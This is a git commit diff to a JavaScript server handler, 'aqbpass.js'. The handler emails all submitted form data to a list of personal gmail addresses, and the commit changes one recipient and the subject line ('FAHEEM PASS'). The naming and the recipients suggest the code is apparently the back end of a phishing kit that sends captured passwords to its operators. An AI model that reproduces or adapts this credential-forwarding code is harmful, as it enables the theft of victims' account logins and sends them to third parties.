fba51e5bc303a80b8ad332a70be2d283dea0f3b4
nxnxcmmc-sys <nxnxcmmc@gmail.com>
2026-04-19 18:21:35 +0500

    Update aqbpass.js

--- aqbpass.js
+++ aqbpass.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,facebookteamads4@gmail.com",
-      subject: "MANSOR PASS",
+      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,daviddavid557374@gmail.com",
+      subject: "FAHEEM PASS",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
